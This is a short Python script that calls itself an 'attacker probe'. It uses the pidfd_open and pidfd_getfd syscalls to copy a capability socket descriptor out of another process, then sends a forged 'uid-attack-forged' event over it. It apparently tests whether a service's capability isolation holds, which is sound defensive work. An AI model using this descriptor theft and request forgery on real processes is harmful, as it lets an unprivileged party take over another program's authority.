"""Attacker probe: attempt pidfd_open + pidfd_getfd copy of the capability FD."""

from __future__ import annotations

import ctypes
import json
import os
import platform
import socket
import sys

CAPABILITY_FD = 198


def probe(target_pid: int) -> dict[str, object]:
    if platform.system() != "Linux" or platform.machine() != "x86_64":
        return {"supported": False}
    libc = ctypes.CDLL(None, use_errno=True)
    pidfd = libc.syscall(434, target_pid, 0)
    if pidfd < 0:
        return {
            "supported": True,
            "pidfd_open_errno": ctypes.get_errno(),
            "duplicated": False,
            "invoked": False,
        }
    try:
        duplicate = libc.syscall(438, pidfd, CAPABILITY_FD, 0)
        if duplicate >= 0:
            invoked = False
            try:
                sock = socket.socket(fileno=duplicate)
                sock.settimeout(3.0)
                sock.sendall(
                    b'{"channel":"wecom","channel_event_id":"uid-attack-forged"}\n'
                )
                data = sock.recv(256)
                invoked = b"spike:" in data
                sock.close()
            except OSError:
                try:
                    os.close(duplicate)
                except OSError:
                    pass
            return {
                "supported": True,
                "pidfd_open_errno": None,
                "duplicated": True,
                "invoked": invoked,
                "pidfd_getfd_errno": None,
            }
        return {
            "supported": True,
            "pidfd_open_errno": None,
            "duplicated": False,
            "invoked": False,
            "pidfd_getfd_errno": ctypes.get_errno(),
        }
    finally:
        os.close(pidfd)


if __name__ == "__main__":
    print(json.dumps(probe(int(sys.argv[1])), sort_keys=True))
